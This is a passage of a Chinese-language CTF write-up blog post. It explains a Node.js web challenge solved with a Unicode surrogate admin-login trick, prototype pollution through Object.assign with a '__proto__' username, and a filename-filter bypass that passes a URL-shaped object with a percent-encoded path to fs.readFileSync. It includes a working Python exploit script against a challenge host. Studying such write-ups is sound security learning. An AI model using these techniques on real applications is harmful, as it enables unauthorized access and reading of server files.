class="line"></span><br></pre></td></tr></table></figure>
+<p>重点还是放在这个源码上<code>app.js</code>从这里也可以看到题目的逻辑<br>可以看到是存在一个admin账户的，但是有2个emoji该怎么输入呢？，这里就是js的一个特性了，我们可以直接拖进console界面：<code>&quot;😀admin😀&quot;.substring(1,6)</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670038305943-c8455667-6ced-4720-a5e4-00cc7c3bed0d.png#averageHue=%23faf6f3&clientId=uda88292f-3ef7-4&from=paste&height=47&id=u96fe0c4c&name=image.png&originHeight=59&originWidth=318&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4002&status=done&style=none&taskId=u20c646cc-321b-4735-a90f-a6b2ed04259&title=&width=254.4" alt="image.png"><br>得到<code>\uDE00admi</code>，这里又涉及到一个小tips，由源码也不难知道,我们输入的payload是以json的格式传输过去，所以可以识别unicode编码的字符串，因此在登录界面用burpsuite抓包然后改包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670038541022-266e3e6a-98e5-4734-9141-4ecf8ca309cf.png#averageHue=%23f6f5f5&clientId=uda88292f-3ef7-4&from=paste&height=291&id=ua6c35d24&name=image.png&originHeight=364&originWidth=1284&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63305&status=done&style=none&taskId=uc1fad60b-d9b8-48a2-81de-d6a2e57e80b&title=&width=1027.2" alt="image.png"><br>成功登录进去了，把返回的connect-id自己加上即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670038605808-deac3671-a606-4357-9811-8925f9baba88.png#averageHue=%231f2d3c&clientId=uda88292f-3ef7-4&from=paste&height=427&id=u388fd100&name=image.png&originHeight=534&originWidth=1220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34608&status=done&style=none&taskId=u36b1b042-6f94-4a66-b951-454519f6a05&title=&width=976" alt="image.png"><br>可是仍然购买不了flag，根据源码可以知道还需要满足一个条件<code>if(user.money &gt;= 11 &amp;&amp; user.token)</code>就是user对象还需要有token这个属性<br>那我们怎么给他加上呢？这边就涉及到了原型链污染，原型链是什么就不赘述很基础的东西<br>审计buyapi函数：<br><code> Object.assign(order[user.username], product);</code>他使用了assign对order[user.username]添加了属性，那假如<code>user.username=__proto__</code>是否就可以直接污染原型了？显然是正确的<br>所以接下来只需要改用户名，然后抓包改一下payload：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670038786148-3479d2d9-3e09-4a7e-9412-3a03c9210b90.png#averageHue=%23f8f7f7&clientId=uda88292f-3ef7-4&from=paste&height=302&id=u0ccf3816&name=image.png&originHeight=377&originWidth=1259&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53686&status=done&style=none&taskId=ub4c1d4d5-1132-430b-9c02-9988b903656&title=&width=1007.2" alt="image.png"><br>可以看到有token了，进入了第二层判断,最后一层做了一个过滤，就是name中不得有<code>flag</code>字符串，这道坎该怎么去翻过去呢，我们把name改为一个空对象看会发生什么:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670038875402-8e550b18-e7ff-4e5a-b479-4bf728c4846d.png#averageHue=%23f4f4f4&clientId=uda88292f-3ef7-4&from=paste&height=464&id=u02fd56eb&name=image.png&originHeight=580&originWidth=1290&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111010&status=done&style=none&taskId=u7de27b49-32f2-4aac-8d25-8779fdb92e8&title=&width=1032" alt="image.png"><code>TypeError [ERR_INVALID_ARG_TYPE]: The &amp;quot;path&amp;quot; argument must be of type string or an instance of Buffer or URL</code><br>报错信息中提示了我们一下，我们的name要不然是字符串，要不然就应该是一个URL实例，在本地测试一下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url=<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&quot;file://C:\\Users\\xxxx\\Desktop\\Useful\\danger\\fl%61g.txt&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line">flag=fs.<span class="title function_">readFileSync</span>(url)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(flag.<span class="title function_">toString</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670039145495-d8f618df-2f48-4684-968d-c9e7809e45c9.png#averageHue=%232b2b2b&clientId=uda88292f-3ef7-4&from=paste&height=234&id=u794e86e2&name=image.png&originHeight=293&originWidth=948&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24427&status=done&style=none&taskId=ufc2a15c0-cf35-4d0a-a87a-f0adbf43c44&title=&width=758.4" alt="image.png"><br>成功的被我们读取了出来,url会识别url编码，所以可以达到绕过，我们只需要仿照上面的url格式去传参即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line">          <span class="string">&quot;href&quot;</span>: <span class="string">&#x27;file:///fl%61g&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;origin&quot;</span>: <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;protocol&quot;</span>: <span class="string">&#x27;file:&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;host&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;hostname&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;port&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;pathname&quot;</span>: <span class="string">&#x27;/fl%61g&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;search&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&quot;searchParams&quot;</span>: <span class="string">&quot;URLSearchParams &#123;&#125;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;hash&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="number">2</span>,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>:<span class="literal">True</span></span><br><span class="line">    &#125;</span><br><span class="line">data=json.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">url=<span class="string">&quot;http://25e33aa8-4097-44f6-a4de-534fe3161134.node4.buuoj.cn:81/buy&quot;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">    <span class="string">&quot;connect.sid&quot;</span>:<span class="string">&quot;s%3A3UT1RE1gNE_qKz96N4MyFw4Hfh3sCJ-E.pmFoCQu%2BSv7XPLAiU2ZfosJNlBXIsplesg3b6NIIWjM&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">f=requests.post(url=url,data=data,headers=headers,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(f.text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670039263442-e0ba65d4-17b5-4c7e-9682-0adf8b8b0c37.png#averageHue=%232f2e2d&clientId=uda88292f-3ef7-4&from=paste&height=110&id=ua54744dd&name=image.png&originHeight=138&originWidth=1844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30839&status=done&style=none&taskId=u4931d565-30e5-4627-967d-50e20b862b3&title=&width=1475.2" alt="image.png"><br>sure~</p>
+<h2 id="zzz-again"><a href="#zzz-again" class="headerlink" title="zzz_again"></a>zzz_again</h2><p>考点：PHP代码究极审计<br>参考：</p>
+<p>跟着走就可以了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670042571856-f407666c-27fe-4e86-9cd2-393989390dc7.png#averageHue=%23f5f5f5&clientId=uda88292f-3ef7-4&from=paste&height=293&id=uc96a004a&name=image.png&originHeight=366&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69927&status=done&style=none&taskId=u04bab90d-4251-45dc-9116-adbe4b72ee9&title=&width=951.2" alt="image.png"></p>
+<h2 id="JavaMaster"><a href="#JavaMaster" class="headerlink" title="JavaMaster"></a>JavaMaster</h2><p>考点：内存马注入，CC11链利用，gopher<br>也请参考官方WP：<br>还是没学到这里，就看得懂一半多一点，正在往JAVA靠<br>手打内存马，真牛。。。。</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/DASCTF/" class="tag">#DASCTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">DASCTF 十月挑战赛</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/UNCTF2022-WP/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">UNCTF2022-WP</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
